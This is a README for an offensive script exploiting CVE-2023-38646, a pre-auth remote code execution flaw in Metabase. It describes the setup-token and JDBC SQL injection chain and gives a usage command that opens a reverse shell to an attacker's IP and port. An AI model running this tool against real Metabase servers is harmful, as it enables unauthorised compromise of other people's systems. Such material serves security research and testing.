# CVE-2023-38646

This script creates a reverse shell targeting CVE-2023-38646 (CVSS 9.8). It is developed from the article [Chaining our way to Pre-Auth RCE in Metabase (CVE-2023-38646)](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646).

# How it works:
A token called "setup-token" is used to allow users to setup Metabase. However, for vulnerable versions of Metabase this token is not removed after setup.
This token is accessible to unauthenticated users under "/api/session/properties" - however the script is able to automatically retrieve the token.

As part of the setup process, an endpoint exists at /api/setup/validate which takes in a JDBC URI as a part of the POST request and then validates the connection before allowing you to complete the setup. However, this is also not disabled after inital setup and can be used with the set-up token.

Further, Assetnote found a 0day SQL injection vulnerability which allows commands be to executed on the remote host. Using this, a reverse shell can be spawned.

For more detailed information, please see the [full article](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646).

# How to use this script:
`python3 CVE-2023-38646.py --lhost {KALI IP} --lport {KALI LISTENING PORT} --url http://{DOMAIN_OF_LOGIN_PAGE-NOT_PATH!}`

options:
* -h, --help    - show this help message and exit
* --url URL     - URL of the login page
* --lhost LHOST  - Your attacker machine IP
* --lport LPORT - Your attacker machine listening port

Example:
![Example Screenshot](Example%20Screenshot.png)

# Disclaimer
This script is provided for educational and awareness purposes only. It is intended to demonstrate a security vulnerability and should only be used in environments where you have explicit authorization to test for and mitigate such vulnerabilities. Unauthorised use of this script on systems without proper authorization may be illegal and could result in legal consequences. 
The author of this script are not responsible for any misuse or damage caused by the execution of this code. Use at your own risk.
By using this script, you agree that you have read and understood this disclaimer and assume full responsibility for any actions taken.

# Acknowledgements:
This script was developed from the article [Chaining our way to Pre-Auth RCE in Metabase (CVE-2023-38646)](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646).
Inspiration was also taken from [Metabase Pre-Auth RCE (CVE-2023-38646) POC](https://github.com/Pyr0sec/CVE-2023-38646) by [Pyr0sec](https://github.com/Pyr0sec).
